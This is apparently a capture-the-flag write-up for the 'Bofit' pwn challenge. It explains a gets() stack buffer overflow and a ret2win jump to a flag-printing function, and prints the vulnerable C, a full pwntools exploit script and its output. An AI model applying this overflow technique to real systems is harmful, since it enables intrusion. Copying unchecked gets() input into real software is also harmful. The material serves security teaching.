# Bofit

The description for the challenge is as follows:

*Because Bop It is copyrighted, apparently*

*nc umbccd.io 4100*

*Author: trashcanna*

The challenge was in the Pwn category, and it was worth 125 points. It came with a downlable binable and C source code. I will note that this challenge would have still been very doable without the sourcecode, but I will include snippets of it here for illustration purposes.

**TL;DR Solution:** Just do an overflow when the opportunity of "Shout it!" is presented and ret2win.

Initially running the live challenge produced a very straightforward interaction with the program:

```
knittingirl@piglet:~/CTF/cyberdawg$ nc umbccd.io 4100
Welcome to BOF it! The game featuring 4 hilarious commands to keep players on their toes
You'll have a second to respond to a series of commands
BOF it: Reply with a capital 'B'
Pull it: Reply with a capital 'P'
Twist it: Reply with a capital 'T'
Shout it: Reply with a string of at least 10 characters
BOF it to start!
B
Twist it!
T
Shout it!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Twist it!
a
```
And the checksec on this looks pretty straightforward:
```
knittingirl@piglet:~/CTF/cyberdawg$ checksec bofit
[*] '/home/knittingirl/CTF/cyberdawg/bofit'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
An examination of the source code in C shows a clear vulnerability in the case that 'Shout it' occurs; user input is taken with gets(), so we should be able to get a buffer overflow very easily.
```
case 3:
				printf("Shout it!\n");
				gets(input);
				if(strlen(input) < 10) correct = false;
				break;
```
In addition, the challenge creators have helpfully included a win function that will print the flag if called:
```
void win_game(){
	char buf[100];
	FILE* fptr = fopen("flag.txt", "r");
	fgets(buf, 100, fptr);
	printf("%s", buf);
}
```
There are various ways in which I could get the exact address of the win_game() function; I like to use Ghidra.
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined win_game()
             undefined         AL:1           <RETURN>
             undefined8        Stack[-0x10]:8 local_10                                XREF[2]:     00401275(W), 
                                                                                                   00401279(R)  
             undefined1        Stack[-0x78]:1 local_78                                XREF[2]:     0040127d(*), 
                                                                                                   0040128e(*)  
                             win_game                                        XREF[3]:     Entry Point(*), 004021e0, 
                                                                                          00402298(*)  
        00401256 f3 0f 1e fa     ENDBR64
        0040125a 55              PUSH       RBP

```

Finally, I will note that there appear to be no cases in which the function calls exit(), and it will return if you trigger the break on any of the cases by answering incorrectly. 
```
return score;
```
All of this means that our exploit should be extremely simple. We want to pass in enough characters on a "Shout it!" turn to overflow into the return pointer, then return into the win function to print the flag. I used the cyclic method with gdb to determine my padding, then finished the exploit by adding the address of win_game in order to jump there when I deliberately trigger the return condition. The final script looks like this:
```
from pwn import *

#target = process(b'./bofit')

#pid = gdb.attach(target, "\nb *play_game+368\ncontinue")
target = remote('umbccd.io',  4100)

print(target.recvuntil(b'BOF it to start!'))

target.sendline(b'B')

while True:
	current = target.recvuntil(b'it!')
	print(current)
	if b'BOF' in current:
		target.sendline(b'B')
	elif b'Pull' in current:
		target.sendline(b'P')
	elif b'Twist' in current:
		target.sendline(b'T')
	else:
		#payload = cyclic(200)
		padding = b'a' * 56
		payload = padding
		payload += p64(0x00401256)
		target.sendline(payload)
		break
print(target.recvuntil(b'it!'))
target.sendline(b'wrong')
target.interactive()
```
And the result looks like this:
```
knittingirl@piglet:~/CTF/cyberdawg$ python3 bofit_payload.py 
[+] Opening connection to umbccd.io on port 4100: Done
b"Welcome to BOF it! The game featuring 4 hilarious commands to keep players on their toes\nYou'll have a second to respond to a series of commands\nBOF it: Reply with a capital 'B'\nPull it: Reply with a capital 'P'\nTwist it: Reply with a capital 'T'\nShout it: Reply with a string of at least 10 characters\nBOF it to start!"
b'\nTwist it!'
b'\nPull it!'
b'\nBOF it!'
b'\nShout it!'
b'\nBOF it!'
[*] Switching to interactive mode

DawgCTF{n3w_h1gh_sc0r3!!}
[*] Got EOF while reading in interactive
$  

```
